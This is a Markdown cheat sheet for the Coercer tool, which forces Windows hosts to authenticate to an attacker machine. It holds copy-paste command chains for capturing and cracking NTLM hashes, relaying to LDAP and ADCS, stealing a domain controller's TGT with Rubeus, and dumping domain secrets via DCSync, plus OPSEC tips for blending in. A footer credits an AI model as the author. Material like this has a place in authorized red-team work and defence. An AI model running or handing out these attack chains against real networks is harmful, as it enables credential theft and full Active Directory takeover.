# Coercer

**Tags:** `#coercer` `#ntlmcoercion` `#lateral` `#activedirectory` `#unconstrained` `#relay` `#printerbug`

Automated authentication coercion tool — forces Windows hosts to authenticate to an attacker-controlled machine using MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, and other RPC protocols. The modern successor to individual coercion exploits (PrinterBug, PetitPotam) — tries all available coercion methods in one shot. Used to capture hashes (with Responder) or relay authentication (with ntlmrelayx) from targets that wouldn't otherwise authenticate to you.

**Source:** https://github.com/p0dalirius/Coercer
**Install:** `pip install coercer` or `sudo apt install coercer`

```bash
# Coerce target to authenticate to Kali (catch with Responder/ntlmrelayx)
coercer coerce -t 192.168.1.10 -l KALI-IP -u user -p Password -d domain.local
```

> [!note] **Coercer use cases** — (1) Capture machine account hash (relay to LDAP for RBCD, or crack for Silver Ticket). (2) Unconstrained delegation abuse — coerce a DC to authenticate to a compromised server with unconstrained delegation to steal the DC's TGT. (3) Force authentication when hosts aren't generating broadcast traffic for Responder to capture.

---

## Modes

```bash
# COERCE — force authentication (main attack mode)
coercer coerce -t <target> -l <listener-ip> -u user -p Password -d domain.local

# SCAN — check which coercion methods are available (no auth triggered)
coercer scan -t <target> -u user -p Password -d domain.local

# FUZZ — test all methods including potentially unstable ones
coercer fuzz -t <target> -l <listener-ip> -u user -p Password -d domain.local
```

---

## Coerce — Force Authentication

```bash
# Basic coercion — listener is your Kali IP (Responder running)
coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -p Password -d domain.local

# Pass the Hash
coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -H :NTLMhash -d domain.local

# Target multiple hosts from file
coercer coerce -T targets.txt -l 192.168.1.200 -u user -p Password -d domain.local

# Specific coercion method only
coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -p Password -d domain.local \
  --filter-method-name MS-RPRN

# Verbose
coercer coerce -t 192.168.1.50 -l 192.168.1.200 -u user -p Password -d domain.local -v
```

---

## Scan — Check Available Methods

```bash
# Non-destructive check — which methods are available
coercer scan -t 192.168.1.50 -u user -p Password -d domain.local

# Multiple targets
coercer scan -T targets.txt -u user -p Password -d domain.local

# Export to JSON
coercer scan -t 192.168.1.50 -u user -p Password -d domain.local --export-json scan.json
```

---

## Coercion Methods

| Protocol | Notes |
|---|---|
| MS-RPRN (PrinterBug) | Most reliable — requires Print Spooler running on target |
| MS-EFSRPC (PetitPotam) | Works without auth on unpatched systems |
| MS-DFSNM | Requires DFS service |
| MS-FSRVP | File Server VSS Agent |

---

## Attack Chains

### Hash Capture → Crack

```bash
# Terminal 1 — Responder
sudo responder -I tun0 -v

# Terminal 2 — Coerce
coercer coerce -t 192.168.1.50 -l KALI-IP -u user -p Password -d domain.local

# Crack captured NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Relay to LDAP (RBCD)

```bash
# Terminal 1 — ntlmrelayx → LDAP
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --delegate-access --escalate-user lowpriv

# Terminal 2 — Coerce server → auth hits ntlmrelayx → RBCD configured
coercer coerce -t 192.168.1.50 -l KALI-IP -u user -p Password -d domain.local
```

### Unconstrained Delegation TGT Theft

```bash
# On compromised host with unconstrained delegation:
Rubeus.exe monitor /interval:5 /nowrap

# Kali — coerce DC to authenticate to the compromised host
coercer coerce -t dc01.domain.local -l COMPROMISED-IP -u user -p Password -d domain.local

# DC's TGT arrives in Rubeus monitor → import → DCSync
Rubeus.exe ptt /ticket:<BASE64>
secretsdump.py -k -no-pass DOMAIN/DC01$@dc01.domain.local
```

### PetitPotam → ESC8 (ADCS HTTP Relay)

```bash
# Terminal 1 — relay to ADCS enrollment endpoint
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Terminal 2 — coerce DC via MS-EFSRPC
coercer coerce -t dc01.domain.local -l KALI-IP -u user -p Password -d domain.local \
  --filter-method-name MS-EFSRPC

# Certificate issued → authenticate as DC
certipy auth -pfx dc01.pfx -dc-ip 192.168.1.1
```

---

## OPSEC Notes

- MS-RPRN requires Print Spooler running — check with `Get-Service Spooler` before trying
- PetitPotam (MS-EFSRPC) generates Event ID **4648** on the coerced target
- `scan` mode is significantly quieter than `coerce` — use scan first to identify viable methods
- Coercion from a domain account looks like a legitimate domain RPC call

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
